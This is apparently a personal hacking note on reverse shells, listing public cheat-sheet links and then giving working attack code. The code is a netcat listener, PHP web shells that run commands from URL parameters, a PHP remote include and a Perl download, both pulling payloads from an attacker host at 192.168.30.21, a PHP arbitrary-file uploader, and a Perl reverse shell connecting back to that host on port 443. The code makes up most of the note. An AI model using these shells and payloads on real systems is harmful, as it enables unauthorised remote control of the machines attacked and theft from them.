---
is_a: "[[note]]"
topics: "[[hacking]]"
---
# Notes
Most systems are protected by firewalls restricting inbound traffic. A reverse shell bypasses this by making *outbound* connections from the system to a hacker-controlled one.

## Links
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- http://roo7break.co.uk/?p=215
- [Bernardo Dag: Reverse shells one-liners](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
- [lanmaster53.com](https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
	- [http://laudanum.secureideas.net/](http://laudanum.secureideas.net/)
- http://pentestmonkey.net/blog/post-exploitation-without-a-tty
- https://gtfobins.github.io/#+reverse%20shell
- https://snyk.io/blog/reverse-shell-attack/

# Netcat listener
You need a listener for the reverse shell to connect back to. It should be open to the internet (or at least the IPs being attacked).
```bash
nc -lvp 9001
```

# Shell One-liners

```
PHP one-liners

<?php echo system($_GET['cmd']); ?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php include "http://192.168.30.21/php-reverse-shell443.php"; ?>
```

This will execute $cmd in the background (no cmd window) without PHP waiting for it to finish, on both Windows and Unix.
```
<?php
function execInBackground($cmd) {
if (substr(php_uname(), 0, 7) == "Windows"){
pclose(popen("start /B ". $cmd, "r"));
}
else {
exec($cmd . " > _dev_null &");
}
}
?>
```

Short php uploader
```
<?php
try {
ini_set('allow_url_fopen', true);
$data = file_get_contents($_GET['url']);
$handle = fopen($_GET['dest'], "w");
fwrite($handle, $data);
fclose($handle);
echo 'Download succeeded';
} catch (Exception $e) {
echo 'Caught exception: ',  $e->getMessage(), "\n";
}
?>
```

Use perl when no wget
```
perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://192.168.30.21/28718.c"); my $where = $ff->fetch() or die $ff->error;'
```

Need to test, but should create a reverse shell in Perl on both Linux and Windows
 # Create reverse shell in background
```
my $pid = fork;
if ($pid == 0) {
my $c=new IO::Socket::INET(PeerAddr=>"192.168.30.21:443");
STDIN->fdopen($c, 'r');
STDOUT->fdopen($c, 'w');
STDERR->fdopen($c, 'w');
while (<>) {
system($_);
}
}
```
